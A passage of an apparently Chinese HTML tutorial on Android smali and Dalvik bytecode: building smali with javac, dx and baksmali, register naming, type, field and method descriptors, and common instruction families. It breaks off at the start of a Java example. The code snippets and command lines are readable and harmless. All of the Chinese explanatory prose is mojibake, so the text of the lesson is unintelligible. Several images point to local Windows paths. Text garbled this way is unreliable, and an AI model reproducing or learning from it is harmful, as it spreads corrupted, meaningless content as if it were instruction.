smali"></a><strong>Java -&gt; smali</strong></h3><p>smali æ–‡ä»¶æ˜¯æ€ä¹ˆå¾—åˆ°çš„å‘¢ï¼Ÿ</p><ol><li><p>é€šè¿‡ javac æŠŠ .java ç¼–è¯‘æˆ .class</p></li><li><p>é€šè¿‡ dx æŠŠ .class è½¬åŒ–ä¸º .dex</p></li><li><p>é€šè¿‡ baksmali æŠŠ .dex è½¬ä¸º smali</p></li></ol><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">javac Test.java</span><br><span class="line">dx --dex --output=Test.dex Test.class</span><br><span class="line">java -jar baksmali.jar d Test.dex</span><br></pre></td></tr></table></figure><h3 id="Dalvik-å¯„å­˜å™¨"><a href="#Dalvik-å¯„å­˜å™¨" class="headerlink" title="Dalvik å¯„å­˜å™¨"></a><strong>Dalvik</strong> <strong>å¯„å­˜å™¨</strong></h3><p>Dalvikä¸­ çš„å¯„å­˜å™¨éƒ½æ˜¯ 32 ä½å¤§å°ï¼Œæ”¯æŒæ‰€æœ‰ç±»å‹ã€‚å¯¹äºå°äºæˆ–ç­‰äº 32 ä½ç±»å‹ï¼Œä½¿ç”¨ä¸€ä¸ªå¯„å­˜å™¨å°±å¯</p><p>ä»¥äº†ï¼Œå¯¹ 64 ä½ï¼ˆlong å’Œ double) ç±»å‹ï¼Œéœ€è¦ä½¿ç”¨ä¸¤ä¸ªç›¸é‚»çš„å¯„å­˜å™¨æ¥å­˜å‚¨ã€‚</p><p><strong>å¯„å­˜å™¨çš„å‘½åæ³•æœ‰ä¸¤ç§ï¼š****V</strong> <strong>å‘½åæ³•å’Œ</strong> <strong>P</strong> <strong>å‘½åæ³•ï¼š</strong></p><p> v å‘½åæ³•ï¼šå±€éƒ¨å˜é‡å¯„å­˜å™¨ V0-Vnï¼Œå‚æ•°å¯„å­˜å™¨æ˜¯ Vn-V(n+m)ã€‚</p><p> p å‘½åæ³•ï¼šå‚æ•°å¯„å­˜å™¨ P0-Pnï¼Œå˜é‡å¯„å­˜å™¨ V0-Vnã€‚</p><h4 id="v-å‘½åæ³•"><a href="#v-å‘½åæ³•" class="headerlink" title="v å‘½åæ³•"></a><strong>v</strong> <strong>å‘½åæ³•</strong></h4><p><img src="C:\Users\17687\AppData\Roaming\Typora\typora-user-images\image-20240308224545382.png" alt="image-20240308224545382"></p><p>v0-v2 è¡¨ç¤ºçš„æ˜¯å±€éƒ¨å˜é‡å¯„å­˜å™¨ï¼Œv3-v4 è¡¨ç¤ºçš„å‚æ•°å¯„å­˜å™¨ã€‚åœ¨ä¾‹ä¸€ä¸­ç¬¬ä¸€ä¸ªæ–¹æ¡†é‡Œå¯ä»¥çœ‹åˆ° v2 æ˜¯å±€éƒ¨å¯„å­˜å™¨ï¼Œ v3 æ˜¯å‚æ•°å¯„å­˜å™¨ã€‚åœ¨å›¾ä¸­ç¬¬äºŒä¸ªæ–¹æ¡†é‡Œå¯ä»¥çœ‹åˆ° v0 æ˜¯å±€éƒ¨å¯„å­˜å™¨ï¼Œv4 æ˜¯å‚æ•°å¯„å­˜å™¨ã€‚</p><h4 id="p-å‘½åæ³•"><a href="#p-å‘½åæ³•" class="headerlink" title="p å‘½åæ³•"></a><strong>p</strong> <strong>å‘½åæ³•</strong></h4><p>p å‘½åæ³•é’ˆå¯¹å‚æ•°å¯„å­˜å™¨è¿›è¡Œäº†ä¼˜åŒ–ï¼Œå‚æ•°å¯„å­˜å™¨çš„å‘½åä» p0 å¼€å§‹ï¼Œä½¿å¾—å±€éƒ¨å˜é‡å¯„å­˜å™¨å’Œå‚æ•°å¯„å­˜å™¨å¾—ä»¥å¾ˆå®¹æ˜“çš„è¿›è¡ŒåŒºåˆ†ã€‚smali è¯­æ³•ä¸­å°±æ˜¯ç”¨äº† p å‘½åæ³•ã€‚æˆ‘ä»¬æ¥çœ‹ä¸‹ add() æ–¹æ³•çš„ smali ä»£ç ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">.method <span class="keyword">public</span> <span class="title function_">add</span><span class="params">(II)</span>I</span><br><span class="line">.registers <span class="number">4</span></span><br><span class="line">.param p1, <span class="string">&quot;a&quot;</span> # I</span><br><span class="line">.param p2, <span class="string">&quot;b&quot;</span> # I</span><br><span class="line">.prologue</span><br><span class="line">.line <span class="number">6</span></span><br><span class="line">add-<span class="type">int</span> v0, p1, p2</span><br><span class="line">.line <span class="number">7</span></span><br><span class="line">.local v0, <span class="string">&quot;c&quot;</span>:I</span><br><span class="line"><span class="keyword">return</span> v0</span><br><span class="line">.end method</span><br></pre></td></tr></table></figure><p>è¿™æ ·å°±å¾ˆæ¸…æ™°äº†ï¼Œ4 ä¸ªå¯„å­˜å™¨å‘½åå¦‚ä¸‹æ‰€ç¤ºï¼š</p><ul><li><p>v0 å±€éƒ¨å˜é‡å¯„å­˜å™¨ï¼Œå­˜å‚¨ a+b çš„å€¼</p></li><li><p>p0 å½“å‰å¼•ç”¨ this</p></li><li><p>p1 å‚æ•°å¯„å­˜å™¨ï¼Œå­˜å‚¨ a çš„å€¼</p></li><li><p>p2 å‚æ•°å¯„å­˜å™¨ï¼Œå­˜å‚¨ b çš„å€¼</p></li></ul><h3 id="Dalvik-æè¿°ç¬¦"><a href="#Dalvik-æè¿°ç¬¦" class="headerlink" title="Dalvik æè¿°ç¬¦"></a><strong>Dalvik</strong> <strong>æè¿°ç¬¦</strong></h3><p>åœ¨æ›´æ·±å…¥çš„äº†è§£ Dalvik å­—èŠ‚ç å‰ï¼Œå…ˆæ¥çœ‹ä¸€ä¸‹ Dalvik æ˜¯å¦‚ä½•æè¿°å­—æ®µå’Œæ–¹æ³•çš„ï¼Œè¿™ä¹Ÿæœ‰åŠ©äºæˆ‘ä»¬é˜…è¯»smali ä»£ç ã€‚</p><h4 id="ç±»å‹æè¿°ç¬¦"><a href="#ç±»å‹æè¿°ç¬¦" class="headerlink" title="ç±»å‹æè¿°ç¬¦"></a><strong>ç±»å‹æè¿°ç¬¦</strong></h4><p>Dalvik å­—èŠ‚ç ä¸­åªæœ‰ä¸¤ç§ç±»å‹ï¼ŒåŸºæœ¬ç±»å‹å’Œå¼•ç”¨ç±»å‹ã€‚é™¤äº†å¯¹è±¡å’Œæ•°ç»„ä»¥å¤–ï¼Œå…¶ä»–çš„æ‰€æœ‰ Java ç±»å‹éƒ½æ˜¯åŸºæœ¬ç±»å‹ã€‚è¿™å’Œ JVM çš„ç±»å‹æè¿°ç¬¦æ˜¯åŸºæœ¬ä¸€è‡´çš„ã€‚åŸºæœ¬ç±»å‹éƒ½æ˜¯ä½¿ç”¨å•ä¸ªå­—æ¯æ¥è¡¨ç¤ºã€‚æ•°ç»„ç±»å‹ä½¿ç”¨[ è¡¨ç¤ºã€‚é™¤æ•°ç»„ä»¥å¤–çš„å¼•ç”¨ç±»å‹ä½¿ç”¨ L åŠ ä¸Šå…¨é™å®šåè¡¨ç¤ºã€‚å¦‚ä¸‹è¡¨æ‰€ç¤ºï¼š</p><p><img src="C:\Users\17687\AppData\Roaming\Typora\typora-user-images\image-20240308224712573.png" alt="image-20240308224712573"></p><p>ä¸¾ä¸€ä¸ªå¼•ç”¨ç±»å‹çš„ä¾‹å­ã€‚ä¾‹å¦‚ String å¯¹è±¡ï¼Œå…¶å…¨é™å®šåæ˜¯ java&#x2F;lang&#x2F;String; ï¼Œåœ¨ Dalvik ä¸­å°±è¡¨ç¤ºä¸º Ljava&#x2F;lang&#x2F;String; ã€‚å¯¹äºæ•°ç»„ï¼Œåˆå¯ä»¥åˆ†ä¸ºåŸºæœ¬ç±»å‹æ•°ç»„å’Œå¼•ç”¨ç±»å‹æ•°ç»„ï¼Œå…¶æ ¼å¼éƒ½æ˜¯ [ åŠ ä¸Šç±»å‹æè¿°ç¬¦ã€‚ int[] å°±æ˜¯ [I ï¼Œ String[] å°±æ˜¯ [java&#x2F;lang&#x2F;String; ã€‚å¤šç»´æ•°ç»„å°±æ˜¯å¤šä¸ª [ ï¼Œä¾‹å¦‚int[][] å°±æ˜¯ [[I ã€‚</p><h4 id="å­—æ®µ"><a href="#å­—æ®µ" class="headerlink" title="å­—æ®µ"></a><strong>å­—æ®µ</strong></h4><p>Dalvik è¡¨ç¤ºå­—æ®µçš„æ ¼å¼ï¼š<strong>ç±»å‹ï¼ˆåŒ…åï¼‹ç±»åï¼‰ï¼‹å­—æ®µåç§°ï¼‹å­—æ®µç±»å‹</strong></p><p>ä¾‹å¦‚ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Lpackage/name/ObjectName;-&gt;FieldName:Ljava/lang/String;</span><br></pre></td></tr></table></figure><p>Lpackage&#x2F;name&#x2F;ObjectName; æ˜¯å½“å‰è¿™ä¸ªå­—æ®µæ‰€åœ¨çš„ç±»ï¼Œå…¶ä¸­ï¼ŒL æ˜¯ javaç±»ç±»å‹ï¼Œ package&#x2F;name&#x2F;æ˜¯åŒ…åï¼Œ ObjectName æ˜¯ç±»åã€‚</p><p>FieldName æ˜¯å­—æ®µåç§°ï¼Œ Ljava&#x2F;lang&#x2F;String; æ˜¯å­—æ®µç±»å‹ã€‚å­—æ®µåç§°å’Œå­—æ®µç±»å‹ä¹‹é—´è¦ç”¨ : éš”</p><p>å¼€ã€‚</p><p>å…¶ä»–ä¾‹å­ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Landroid/content/pm/ActivityInfo;-&gt;theme:I</span><br><span class="line">Lorg/cocos2dx/lua/AppActivity;-&gt;handler:Landroid/os/Handler;</span><br></pre></td></tr></table></figure><h4 id="æ–¹æ³•"><a href="#æ–¹æ³•" class="headerlink" title="æ–¹æ³•"></a><strong>æ–¹æ³•</strong></h4><p>Dalvik æ–¹æ³•çš„è¡¨ç°å½¢å¼ï¼š<strong>ç±»å‹ï¼ˆåŒ…åï¼‹ç±»åï¼‰ï¼‹æ–¹æ³•åï¼ˆï¼‹å‚æ•°ç±»å‹ï¼‰ï¼‹è¿”å›å€¼ç±»å‹</strong></p><p>ä¾‹å¦‚ï¼šLpackage&#x2F;name&#x2F;ObjectName;-&gt;MethodName (III) Z</p><p>MethodName æ˜¯æ–¹æ³•åï¼Œ (III) Z æ˜¯æ–¹æ³•çš„ç­¾åä¿¡æ¯ï¼Œç”±æ–¹æ³•å‚æ•°åˆ—è¡¨(III)å’Œè¿”å›å€¼(Z)æ„æˆï¼Œ(III)è¡¨ç¤ºä¸‰ä¸ª int å‹å‚æ•°ï¼›Z è¡¨ç¤ºè¿”å›å€¼ç±»å‹ä¸º booleanã€‚</p><p>å…¶ä»–ä¾‹å­ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Lcom/test/Test;-&gt;add(II)I</span><br><span class="line">Landroid/os/Handler;-&gt;&lt;init&gt;()V</span><br><span class="line">Landroid/app/Activity;-&gt;onCreate(Landroid/os/Bundle;)V</span><br></pre></td></tr></table></figure><h3 id="Dalvik-æŒ‡ä»¤é›†"><a href="#Dalvik-æŒ‡ä»¤é›†" class="headerlink" title="Dalvik æŒ‡ä»¤é›†"></a><strong>Dalvik</strong> <strong>æŒ‡ä»¤é›†</strong></h3><p>å‚è€ƒèµ„æ–™ï¼šDalvik opcodes</p><p>æœ‰äº†ä¸Šé¢çš„çŸ¥è¯†å‚¨å¤‡ä¹‹åï¼Œå°±å¯ä»¥å…·ä½“çš„å­¦ä¹  Dalvik æŒ‡ä»¤é›†äº†ã€‚</p><p>Dalvik æŒ‡ä»¤æ ¼å¼ä¸ºï¼š<strong>åŸºç¡€å­—èŠ‚ç </strong> <strong>-</strong> <strong>åç§°åç¼€</strong>**&#x2F;**<strong>å­—èŠ‚ç åç¼€ ç›®çš„å¯„å­˜å™¨ æºå¯„å­˜å™¨</strong></p><p>æ³¨ï¼šè¿æ¥ç¬¦å· - åœ¨æœ‰çš„æŒ‡ä»¤é‡Œæ˜¯å¯ä»¥ä¸å­˜åœ¨çš„</p><p>ä¾‹å­ï¼š<strong>move-wide&#x2F;from16 vAA,VBBBB</strong></p><p><strong>move</strong> <strong>ä¸ºåŸºç¡€å­—èŠ‚ç </strong>ï¼šå³ opcodeã€‚</p><p><strong>wide</strong> <strong>ä¸ºåç§°åç¼€</strong>ï¼šæ ‡è¯†æŒ‡ä»¤æ“ä½œçš„æ•°æ®å®½åº¦ä¸º 64 ä½ã€‚</p><p><strong>from16</strong> <strong>ä¸ºå­—èŠ‚ç åç¼€</strong>ï¼šæ ‡è¯†æºä¸ºä¸€ä¸ª 16 ä½çš„å¯„å­˜å™¨å¼•ç”¨å˜é‡ã€‚</p><p><strong>vAA</strong> <strong>ä¸ºç›®çš„å¯„å­˜å™¨</strong>ï¼šå®ƒå§‹ç»ˆåœ¨æºçš„å‰é¢ï¼Œå–å€¼èŒƒå›´ä¸º v0~v255ã€‚</p><p><strong>vBBBB</strong> <strong>ä¸ºæºå¯„å­˜å™¨</strong>ï¼šå–å€¼èŒƒå›´ä¸º v0~v65535ã€‚</p><p>Dalvik æŒ‡ä»¤é›†ä¸­å¤§å¤šæ•°æŒ‡ä»¤ç”¨åˆ°äº†å¯„å­˜å™¨ä½œä¸ºç›®çš„æ“ä½œæ•°æˆ–æºæ“ä½œæ•°ï¼Œå…¶ä¸­ A&#x2F;B&#x2F;C&#x2F;D&#x2F;E&#x2F;F&#x2F;G&#x2F;H ä»£è¡¨ä¸€ä¸ª 4 ä½çš„æ•°å€¼ï¼ŒAA&#x2F;BB&#x2F;â€¦&#x2F;HH ä»£è¡¨ä¸€ä¸ª 8 ä½çš„æ•°å€¼ï¼ŒAAAA&#x2F;BBBB&#x2F;â€¦&#x2F;HHHH ä»£è¡¨ä¸€ä¸ª 16 ä½çš„æ•°å€¼ã€‚</p><p>ä¸€äº›å¸¸è§çš„æŒ‡ä»¤ã€‚</p><h4 id="ç©ºæŒ‡ä»¤"><a href="#ç©ºæŒ‡ä»¤" class="headerlink" title="ç©ºæŒ‡ä»¤"></a><strong>ç©ºæŒ‡ä»¤</strong></h4><p>nop     ç©ºæŒ‡ä»¤ï¼Œé€šå¸¸ç”¨äºå¯¹é½</p><h4 id="æ•°æ®æ“ä½œæŒ‡ä»¤"><a href="#æ•°æ®æ“ä½œæŒ‡ä»¤" class="headerlink" title="æ•°æ®æ“ä½œæŒ‡ä»¤"></a><strong>æ•°æ®æ“ä½œæŒ‡ä»¤</strong></h4><p>æ•°æ®æ“ä½œæŒ‡ä»¤ä¸º moveã€‚move æŒ‡ä»¤æ ¹æ®å­—èŠ‚ç å¤§å°ä¸ç±»å‹ä¸åŒï¼Œåé¢ä¼šè·Ÿä¸Šä¸åŒçš„åç¼€ï¼Œè¡¨è¾¾çš„æ„ä¹‰ä¹Ÿå°±ä¸åŒã€‚</p><p><img src="C:\Users\17687\AppData\Roaming\Typora\typora-user-images\image-20240308225456588.png" alt="image-20240308225456588"></p><p>æ€»ç»“èµ·æ¥ move æŒ‡ä»¤æœ‰ä¸‰ç§ä½œç”¨ï¼š</p><ul><li><p>è¿›è¡Œèµ‹å€¼æ“ä½œ</p></li><li><p>move-result æ¥æ”¶è¿”å›å€¼æ“ä½œ</p></li><li><p>å¤„ç†å¼‚å¸¸çš„æ“ä½œ</p></li></ul><h4 id="è¿”å›æŒ‡ä»¤"><a href="#è¿”å›æŒ‡ä»¤" class="headerlink" title="è¿”å›æŒ‡ä»¤"></a><strong>è¿”å›æŒ‡ä»¤</strong></h4><p>è¿”å›æŒ‡ä»¤å³ return æŒ‡ä»¤ï¼ŒæŒ‡çš„æ˜¯å‡½æ•°ç»“å°¾æ—¶è¿è¡Œçš„æœ€åä¸€æ¡æŒ‡ä»¤ã€‚å…±æœ‰ä»¥ä¸‹å››æ¡è¿”å›æŒ‡ä»¤ï¼š</p><p><img src="C:\Users\17687\AppData\Roaming\Typora\typora-user-images\image-20240308225608978.png" alt="image-20240308225608978"></p><h4 id="æ•°æ®å®šä¹‰æŒ‡ä»¤"><a href="#æ•°æ®å®šä¹‰æŒ‡ä»¤" class="headerlink" title="æ•°æ®å®šä¹‰æŒ‡ä»¤"></a><strong>æ•°æ®å®šä¹‰æŒ‡ä»¤</strong></h4><p>æ•°æ®å®šä¹‰æŒ‡ä»¤ç”¨æ¥å®šä¹‰ç¨‹åºä¸­ç”¨åˆ°çš„å¸¸é‡ï¼Œå­—ç¬¦ä¸²ï¼Œç±»ç­‰æ•°æ®ã€‚å®ƒçš„åŸºç¡€å­—èŠ‚ç ä¸º const</p><p><img src="C:\Users\17687\AppData\Roaming\Typora\typora-user-images\image-20240308225624563.png" alt="image-20240308225624563"></p><h4 id="ç±»å‹åˆ¤æ–­æŒ‡ä»¤"><a href="#ç±»å‹åˆ¤æ–­æŒ‡ä»¤" class="headerlink" title="ç±»å‹åˆ¤æ–­æŒ‡ä»¤"></a><strong>ç±»å‹åˆ¤æ–­æŒ‡ä»¤</strong></h4><p><img src="C:\Users\17687\AppData\Roaming\Typora\typora-user-images\image-20240308225636083.png" alt="image-20240308225636083"></p><h4 id="æ•°ç»„æ“ä½œæŒ‡ä»¤"><a href="#æ•°ç»„æ“ä½œæŒ‡ä»¤" class="headerlink" title="æ•°ç»„æ“ä½œæŒ‡ä»¤"></a><strong>æ•°ç»„æ“ä½œæŒ‡ä»¤</strong></h4><p>æ•°ç»„æ“ä½œåŒ…æ‹¬è·å–æ•°ç»„é•¿åº¦ï¼Œæ–°å»ºæ•°ç»„ï¼Œæ•°ç»„èµ‹å€¼ï¼Œæ•°ç»„å…ƒç´ å–å€¼ä¸èµ‹å€¼ç­‰æ“ä½œã€‚</p><p><img src="C:\Users\17687\AppData\Roaming\Typora\typora-user-images\image-20240308225648985.png" alt="image-20240308225648985"></p><p><strong>å¼‚å¸¸æŒ‡ä»¤</strong></p><p>Dalvik æŒ‡ä»¤é›†æœ‰ä¸€æ¡æŒ‡ä»¤ç”¨æ¥æŠ›å‡ºå¼‚å¸¸ï¼š</p><p>throw vAA  æŠ›å‡º vAA å¯„å­˜å™¨æŒ‡å®šçš„å¼‚å¸¸</p><h4 id="è·³è½¬æŒ‡ä»¤"><a href="#è·³è½¬æŒ‡ä»¤" class="headerlink" title="è·³è½¬æŒ‡ä»¤"></a><strong>è·³è½¬æŒ‡ä»¤</strong></h4><p><img src="C:\Users\17687\AppData\Roaming\Typora\typora-user-images\image-20240308225717003.png" alt="image-20240308225717003"></p><h4 id="æ¯”è¾ƒæŒ‡ä»¤"><a href="#æ¯”è¾ƒæŒ‡ä»¤" class="headerlink" title="æ¯”è¾ƒæŒ‡ä»¤"></a><strong>æ¯”è¾ƒæŒ‡ä»¤</strong></h4><p>æ¯”è¾ƒæŒ‡ä»¤ç”¨äºå¯¹ä¸¤ä¸ªå¯„å­˜å™¨çš„å€¼ï¼ˆæµ®ç‚¹å‹æˆ–é•¿æ•´å‹ï¼‰è¿›è¡Œæ¯”è¾ƒã€‚</p><ul><li><p>å¤§äº(1)&#x2F;ç­‰äº(0)&#x2F;å°äº(-1)&#x3D;&gt;cmpgã€cmp</p></li><li><p>å¤§äº(-1)&#x2F;ç­‰äº(0)&#x2F;å°äº(1)&#x3D;&gt;cmpl</p></li></ul><p>æŒ‡ä»¤å¦‚ä¸‹ï¼š</p><ul><li><p><strong>cmp-long vAA, vBB, vCC</strong> <strong>ï¼š</strong>æ¯”è¾ƒä¸¤ä¸ªé•¿æ•´å‹æ•°ã€‚å¦‚æœvBBå¯„å­˜å™¨å¤§äºvCCå¯„å­˜å™¨ï¼Œåˆ™ç»“æœä¸º1ï¼Œç›¸ç­‰åˆ™ç»“æœä¸º0ï¼Œå°äºåˆ™ç»“æœä¸º-1ã€‚</p></li><li><p><strong>cmpl-float vAA, vBB, vCC****ï¼š</strong>æ¯”è¾ƒä¸¤ä¸ªå•ç²¾åº¦æµ®ç‚¹æ•°ã€‚å¦‚æœvBBå¯„å­˜å™¨å¤§äºvCCå¯„å­˜å™¨ï¼Œç»“æœä¸º-1ï¼Œç›¸ç­‰åˆ™ç»“æœä¸º0ï¼Œå°äºçš„è¯ç»“æœä¸º1ã€‚</p></li><li><p><strong>cmpl-double vAA, vBB, vCC****ï¼š</strong>æ¯”è¾ƒä¸¤ä¸ªåŒç²¾åº¦æµ®ç‚¹æ•°ã€‚å¦‚æœvBBå¯„å­˜å™¨å¤§äºvCCå¯„å­˜å™¨ï¼Œç»“æœä¸º-1ï¼Œç›¸ç­‰åˆ™ç»“æœä¸º0ï¼Œå°äºçš„è¯ç»“æœä¸º1ã€‚</p></li><li><p><strong>cmpg-float vAA, vBB, vCC****ï¼š</strong>æ¯”è¾ƒä¸¤ä¸ªå•ç²¾åº¦æµ®ç‚¹æ•°ã€‚å¦‚æœvBBå¯„å­˜å™¨å¤§äºvCCå¯„å­˜å™¨ï¼Œç»“æœä¸º1ï¼Œç›¸ç­‰åˆ™ç»“æœä¸º0ï¼Œå°äºçš„è¯ç»“æœä¸º-1ã€‚</p></li><li><p><strong>cmpg-double vAA, vBB, vCC****ï¼š</strong>æ¯”è¾ƒä¸¤ä¸ªåŒç²¾åº¦æµ®ç‚¹æ•°ã€‚å¦‚æœvBBå¯„å­˜å™¨å¤§äºvCCå¯„å­˜å™¨ï¼Œç»“æœä¸º1ï¼Œç›¸ç­‰åˆ™ç»“æœä¸º0ï¼Œå°äºçš„è¯ç»“æœä¸º-1ã€‚</p></li></ul><h4 id="å­—æ®µæ“ä½œæŒ‡ä»¤"><a href="#å­—æ®µæ“ä½œæŒ‡ä»¤" class="headerlink" title="å­—æ®µæ“ä½œæŒ‡ä»¤"></a><strong>å­—æ®µæ“ä½œæŒ‡ä»¤</strong></h4><p>å­—æ®µæ“ä½œæŒ‡ä»¤ç”¨æ¥å¯¹å¯¹è±¡å®ä¾‹çš„å­—æ®µè¿›å…¥è¯»å†™æ“ä½œã€‚å­—æ®µçš„ç±»å‹å¯ä»¥æ˜¯ Java ä¸­æœ‰æ•ˆçš„æ•°æ®ç±»å‹ï¼Œå¯¹æ™®</p><p>é€šå­—æ®µä¸é™æ€å­—æ®µæ“ä½œæœ‰ä¸¤ä¸­æŒ‡ä»¤é›†ã€‚</p><ul><li><p>æ™®é€šå­—æ®µ &#x3D;&gt; igetè¯» &#x2F; iput å†™</p></li><li><p>é™æ€å­—æ®µ &#x3D;&gt; sgetè¯» &#x2F; sput å†™</p></li></ul><h5 id="æ™®é€šå­—æ®µ"><a href="#æ™®é€šå­—æ®µ" class="headerlink" title="æ™®é€šå­—æ®µ"></a><strong>æ™®é€šå­—æ®µ</strong></h5><p>iinstanceop vA, vB,field@CCCC</p><p>å¯¹å·²æ ‡è¯†çš„å­—æ®µæ‰§è¡Œå·²ç¡®å®šçš„å¯¹è±¡å®ä¾‹å­—æ®µè¿ç®—ï¼Œå¹¶å°†ç»“æœåŠ è½½æˆ–å­˜å‚¨åˆ°å€¼å¯„å­˜å™¨ä¸­</p><p>é’ˆå¯¹ä¸åŒç±»å‹çš„æ™®é€šå­—æ®µï¼Œæœ‰å¦‚ä¸‹æŒ‡ä»¤ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">igetã€iget-wideã€iget-objectã€iget-<span class="type">boolean</span>ã€iget-<span class="type">byte</span>ã€iget-<span class="type">char</span>ã€iget-<span class="type">short</span></span><br><span class="line">iputã€iput-wideã€iput-objectã€iput-<span class="type">boolean</span>ã€iput-<span class="type">byte</span>ã€iput-<span class="type">char</span>ã€iput-<span class="type">short</span></span><br></pre></td></tr></table></figure><h5 id="é™æ€å­—æ®µ"><a href="#é™æ€å­—æ®µ" class="headerlink" title="é™æ€å­—æ®µ"></a><strong>é™æ€å­—æ®µ</strong></h5><p>sstaticop vAA,field@BBBB</p><p>å¯¹å·²æ ‡è¯†çš„é™æ€å­—æ®µæ‰§è¡Œå·²ç¡®å®šçš„å¯¹è±¡é™æ€å­—æ®µè¿ç®—ï¼Œå¹¶å°†ç»“æœåŠ è½½æˆ–å­˜å‚¨åˆ°å€¼å¯„å­˜å™¨ä¸­</p><p>é’ˆå¯¹ä¸åŒç±»å‹çš„é™æ€å­—æ®µï¼Œæœ‰å¦‚ä¸‹æŒ‡ä»¤ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sgetã€sget-wideã€sget-objectã€sget-<span class="type">boolean</span>ã€sget-<span class="type">byte</span>ã€sget-<span class="type">char</span>ã€sget-<span class="type">short</span></span><br><span class="line">sputã€sput-wideã€sput-objectã€sput-<span class="type">boolean</span>ã€sput-<span class="type">byte</span>ã€sput-<span class="type">char</span>ã€sput-<span class="type">short</span></span><br></pre></td></tr></table></figure><h4 id="æ–¹æ³•è°ƒç”¨æŒ‡ä»¤"><a href="#æ–¹æ³•è°ƒç”¨æŒ‡ä»¤" class="headerlink" title="æ–¹æ³•è°ƒç”¨æŒ‡ä»¤"></a><strong>æ–¹æ³•è°ƒç”¨æŒ‡ä»¤</strong></h4><p>æ–¹æ³•è°ƒç”¨æŒ‡ä»¤çš„æ ¼å¼ä¸º invoke-kind {vC, vD, vE, vF, vG}, meth@BBBB , å…·ä½“çš„æœ‰å¦‚ä¸‹æŒ‡ä»¤ï¼š</p><p><img src="C:\Users\17687\AppData\Roaming\Typora\typora-user-images\image-20240308225931362.png" alt="image-20240308225931362"></p><p><strong>æ•°æ®è½¬æ¢æŒ‡ä»¤</strong></p><p>æ•°æ®è½¬æ¢æŒ‡ä»¤ç”¨äºå°†ä¸€ç§ç±»å‹çš„æ•°å€¼è½¬æ¢æˆå¦ä¸€ç§ç±»å‹ã€‚å®ƒçš„æ ¼å¼ä¸ºâ€œopcode vA, vBâ€ï¼ŒvBå¯„å­˜å™¨å­˜æ”¾éœ€</p><p>è¦è½¬æ¢çš„æ•°æ®ï¼Œè½¬æ¢åçš„ç»“æœä¿å­˜åœ¨vAå¯„å­˜å™¨ä¸­ã€‚</p><p>å¸¸è§çš„æ•°æ®è½¬æ¢æŒ‡ä»¤ï¼š</p><ul><li><p>**neg-**<strong>æ•°æ®ç±»å‹</strong>ï¼šæ±‚è¡¥</p></li><li><p>**not-**<strong>æ•°æ®ç±»å‹</strong>ï¼šæ±‚å</p></li><li><p>*<em>æ•°æ®ç±»å‹</em>***1-to-<strong><strong>æ•°æ®ç±»å‹</strong></strong>2**ï¼šå°†æ•°æ®ç±»å‹1è½¬æ¢ä¸ºæ•°æ®ç±»å‹2</p></li></ul><h4 id="æ•°æ®è¿ç®—æŒ‡ä»¤"><a href="#æ•°æ®è¿ç®—æŒ‡ä»¤" class="headerlink" title="æ•°æ®è¿ç®—æŒ‡ä»¤"></a><strong>æ•°æ®è¿ç®—æŒ‡ä»¤</strong></h4><p>æ•°æ®è¿ç®—æŒ‡ä»¤åŒ…æ‹¬ç®—æœ¯è¿ç®—æŒ‡ä»¤ä¸é€»è¾‘è¿ç®—æŒ‡ä»¤ã€‚ç®—æœ¯è¿ç®—æŒ‡ä»¤ä¸»è¦è¿›è¡Œæ•°å€¼é—´å¦‚åŠ ã€å‡ã€ä¹˜ã€é™¤ã€</p><p>æ¨¡ã€ç§»ä½ç­‰è¿ç®—ï¼Œé€»è¾‘è¿ç®—ä¸»è¦è¿›è¡Œæ•°å€¼é—´ä¸ã€æˆ–ã€éã€å¼‚æˆ–ç­‰è¿ç®—ã€‚</p><p>å¸¸è§çš„æ•°æ®è¿ç®—æŒ‡ä»¤ï¼š</p><ul><li><p><strong>add&#x2F;sub&#x2F;mul&#x2F;div&#x2F;rem</strong>ï¼šåŠ &#x2F;å‡&#x2F;ä¹˜&#x2F;é™¤&#x2F;æ¨¡</p></li><li><p><strong>and&#x2F;or&#x2F;xor</strong>ï¼šä¸&#x2F;æˆ–&#x2F;å¼‚æˆ–</p></li><li><p><strong>shl&#x2F;shr&#x2F;ushr</strong>ï¼šæœ‰ç¬¦å·å·¦ç§»&#x2F;æœ‰ç¬¦å·å³ç§»&#x2F;æ— ç¬¦å·å³ç§»</p></li></ul><h3 id="ç¤ºä¾‹åˆ†æ"><a href="#ç¤ºä¾‹åˆ†æ" class="headerlink" title="ç¤ºä¾‹åˆ†æ"></a><strong>ç¤ºä¾‹åˆ†æ</strong></h3><p>é€šè¿‡<strong>æ¼”ç¤º</strong>ï¼Œè®©æˆ‘ä»¬æ¥çœ‹çœ‹ä¸‹é¢çš„è¿™ä¸ª Java ç¨‹åºåœ¨ smali å±‚é¢æ˜¯æ€æ ·å®ç°çš„ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="type">String</span> <span class="variable">HELLO_WORLD</span> <span class="operator">=</span> <span class="string">&quot;Hello World!&quot;</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> 